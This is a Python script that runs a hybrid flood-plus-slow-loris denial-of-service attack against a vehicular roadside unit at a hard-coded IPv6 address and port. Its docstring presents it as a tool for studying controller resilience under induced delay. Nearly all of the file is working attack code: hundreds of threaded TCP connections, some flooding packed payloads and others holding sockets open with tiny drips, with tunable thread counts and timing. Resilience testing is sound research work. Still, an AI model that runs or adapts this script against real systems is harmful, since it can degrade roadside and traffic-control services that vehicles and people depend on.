#! /usr/bin/env python3
'''
To DoS Atack: flood h/w bufer for RSU form RSPC

Hybrid Flood + Slow Loris DoS Script for RSU
Goal: Cause *delays* instead of complete service collapse.
This lets you study controller resilience under DoS-induced latency.

Approach:
 - Mix of FAST FLOOD sockets (send payloads moderately)
 - SLOW LORIS sockets (send tiny chunks slowly to clog resources)

You can tune:
    NUM_FAST: how many flooding sockets
    NUM_SLOW: how many slow-loris sockets
    DELAY_BETWEEN_SENDS: base delay for flood traffic
    LORIS_INTERVAL: how slow loris sockets drip data

Outputs:
    - RSU stays alive
    - Measurable delay grows with socket load
    - Follows real DoS methods (low-and-slow attack)



Prakhar Gupta
'''

import socket
import time
import threading
import random
import struct

# === CONFIGURATION ===
TARGET_IP = 'fe80::6e5:48ff:fe30:0820'   # RSU IP
TARGET_PORT = 7002
INTERFACE_SCOPE_ID = 4                    # Adjust for your NIC

# TARGET_IP = 'localhost'
# TARGET_PORT = 7005


NUM_FAST = 100      # fast flooding threads
NUM_SLOW = 200      # slow-loris threads

PAYLOAD_SIZE = 4096  # flood payload size
DELAY_BETWEEN_SENDS = 0.4  # flood delay (sec)

LORIS_INTERVAL = (2, 5)   # slow loris drip interval range (sec)

VEH_ARRAY_SIZE = 68       # floats per message

# === ATTACK FUNCTIONS ===

def flood_thread():
    """Moderate flooder: sends random float arrays repeatedly."""
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT, 0, INTERFACE_SCOPE_ID))

        while True:
            float_values = [random.uniform(0.0, 100.0) for _ in range(VEH_ARRAY_SIZE)]
            float_values[0] = -1.0   # mark as attack traffic
            packed_data = struct.pack(f'{VEH_ARRAY_SIZE}f', *float_values)
            try:
                s.sendall(packed_data)
                time.sleep(DELAY_BETWEEN_SENDS + random.uniform(0.05, 0.25))
            except Exception as e:
                print(f"[FLOOD] Send error: {e}")
                break
        s.close()
    except Exception as e:
        print(f"[FLOOD] Connection failed: {e}")

def slow_loris_thread():
    """Slow loris: keeps connection open, sends tiny drips."""
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT, 0, INTERFACE_SCOPE_ID))
        
        # Send an initial byte to keep it "active"
        s.send(b"L")

        while True:
            try:
                s.send(b"L")  # drip tiny byte
                sleep_time = random.uniform(*LORIS_INTERVAL)
                time.sleep(sleep_time)
            except Exception as e:
                print(f"[LORIS] Error: {e}")
                break
        s.close()
    except Exception as e:
        print(f"[LORIS] Connection failed: {e}")

# === MAIN ===

def main():
    print(f"[i] Launching hybrid DoS with {NUM_FAST} fast floods + {NUM_SLOW} slow loris threads...")
    threads = []

    # Start flood threads
    for i in range(NUM_FAST):
        t = threading.Thread(target=flood_thread)
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.01)  # slight stagger to avoid spike

    # Start slow loris threads
    for i in range(NUM_SLOW):
        t = threading.Thread(target=slow_loris_thread)
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.05)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[i] Attack stopped by user.")

if __name__ == "__main__":
    main()
